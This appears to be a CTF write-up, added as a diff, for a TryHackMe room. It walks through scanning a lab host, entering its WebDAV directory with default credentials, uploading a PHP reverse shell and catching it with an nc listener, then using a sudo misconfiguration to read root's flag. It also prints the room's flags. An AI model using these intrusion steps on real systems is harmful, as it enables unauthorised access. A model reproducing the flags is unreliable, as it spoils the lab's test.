@@ -1,0 +1,98 @@
+-----------------bsidesgtdav Room Tryhackme-----------------
+Link: https://tryhackme.com/r/room/bsidesgtdav
+Date: 2024-09-16 18:18 GMT
+Ip: 10.10.62.162
+
+--Port scanning
+-->rustscan -a 10.10.62.172 -- -A -sV -sC -O -Pn
+	-80 --> http
+	
+--Directory enumeration
+-->gobuster dir -u http://10.10.62.172/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.62.172/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/webdav               (Status: 401) [Size: 459]
+/server-status        (Status: 403) [Size: 300]
+Progress: 107860 / 207644 (51.94%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 107912 / 207644 (51.97%)
+===============================================================
+Finished
+===============================================================
+ 
+ 
+so we access to webdav directory and it was protected by username and password. We search and found some default credentials 
+wampp:xampp
+
+
+After accessing to this we found a file: passwd.dav. This is it's contain:
+
+wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
+
+So we will try to decrypt the hash.  bt nothing
+
+we will use a tool to upload a reverse ehell :
+-->cadaver http://10.10.62.172/webdav  it will ask us the username and password which will be wampp:xampp and upload my reverse shell.
+
+cadaver http://10.10.62.172/webdav                   
+Authentication required for webdav on server `10.10.62.172':
+Username: wampp
+Password: 
+dav:/webdav/> put rshell.php
+Uploading rshell.php to `/webdav/rshell.php':                                                                                                                  
+Progress: [=============================>] 100.0% of 2583 bytes succeeded.                                                                                     
+dav:/webdav/> 
+
+After that we will go and run it 
+
+rlwrap nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.2.9.70] from (UNKNOWN) [10.10.62.172] 57758
+Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 05:12:26 up 41 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ 
+
+After accessing to the terminal we will stabilize the shell and get the user.txt content.
+
+www-data@ubuntu:/home/merlin$ cat user.txt
+cat user.txt
+449b40fe93f78a938523b7e4dcd66d2a
+www-data@ubuntu:/home/merlin$
+
+
+After that we just do a sudo -l to see if we have permissions.
+
+www-data@ubuntu:/home/merlin$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /bin/cat
+    
+    
+    
+Bingooo...... Wr have all right on cat so we will just read the root.txtfile.
+www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
+sudo cat /root/root.txt
+101101ddc16b0cdf65ba0b8a7af7afa5
+
+
+
+
+Thankyou for reading my opinion of the room @petstar from togo
